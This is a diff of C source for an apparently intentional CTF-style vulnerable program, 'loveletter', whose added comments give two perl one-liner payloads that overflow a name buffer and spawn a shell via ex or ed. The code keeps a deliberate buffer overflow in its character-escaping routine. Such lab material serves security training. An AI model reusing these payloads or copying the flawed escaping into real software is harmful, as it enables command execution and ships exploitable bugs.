@@ -1,4 +1,12 @@
-// echo I love + "" + very much!
+// gcc -o loveletter loveletter.c -m32
+// 
+// payload 1. using ex
+// $ (perl -e 'print "x ", "a"x251, ";", "\x01"') | ./loveletter
+//   !sh
+// 
+// payload 2. using ed
+// $ (perl -e 'print "d ", "a"x251, ";", "\x01"'; cat) | ./loveletter
+//   !sh
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,12 +18,12 @@ unsigned short int idx;
 
 typedef struct _COMMAND{
         char name[MAXSIZE];
-        unsigned int prolen; //SIZE : 0(X)1(O)ff(O). however must write [SIZE] at upper lin
+        unsigned int prolen; //SIZE : 00(X) 01(O)...ff(O).
         unsigned int epilen;
         unsigned int namelen;
 }COMMAND;
 
-// ♡ ♥ --> 3byte
+// Bug : ♡ ♥ --> 3byte
 void protect(char *name){
         char dangerous[] = "#&;`'\"|*?~<>^()[]{}$\\,";
         char buffer[MAXSIZE];
@@ -29,7 +37,7 @@ void protect(char *name){
                         if(name[i] == dangerous[j]){
                                 strcpy(buffer, &name[i+1]); // next strings..
                                 strcpy(&name[i], "♥");      // memcpy requires size... hide size by using strcpy...
-                                strcat(name, buffer);
+                                memcpy(name+strlen(name), buffer, strlen(buffer));
                         }
                 }
         }
@@ -37,27 +45,27 @@ void protect(char *name){
 }
 
 
+char loveletter[1024];
 int main(int argc, char *argv[]){
-        char loveletter_guard[1024]; // prevent from modifing loveletter...from downtown...
-        char loveletter[1024];
-        memset(loveletter,0,1024);
-        memset(loveletter_guard,0,1024);
         COMMAND command;
+        memset(loveletter,0,1024);
         command.epilen = strlen(epilog);
         command.prolen = strlen(prolog);
 
         printf("[*] My lover's name is : ");
         fgets(command.name, MAXSIZE, stdin); 
-        command.name[strlen(command.name)-1] = '\x0';
+        if(command.name[strlen(command.name)-1] == '\x0a'){
+            command.name[strlen(command.name)-1] = '\x0';
+        }
 
         printf("[*] Whatever happens, I'll protect her...\n");
         protect(command.name);
         command.namelen = strlen(command.name);
 
-        printf("[*] Impress her name upon my memory...\n");
+        printf("[*] Impress her upon my memory...\n");
         memcpy(&loveletter[idx], prolog, command.prolen); idx += command.prolen;
-        memcpy(&loveletter[idx], command.name, command.namelen); idx += command.namelen; // memcpy too much byte : stack smashing
-        // To get reach to RET, attacker should overwrite [prolen] length at upper line... (tradeoff)
+        memcpy(&loveletter[idx], command.name, command.namelen); idx += command.namelen; // memcpy too much byte? 
+        // To get reach to RET, attacker can try overwriting prolen bytes...but, this leads stack smashing!
         memcpy(&loveletter[idx], epilog, command.epilen); idx += command.epilen;
        
         printf("[*] Her name echos in my mind...\n"); 
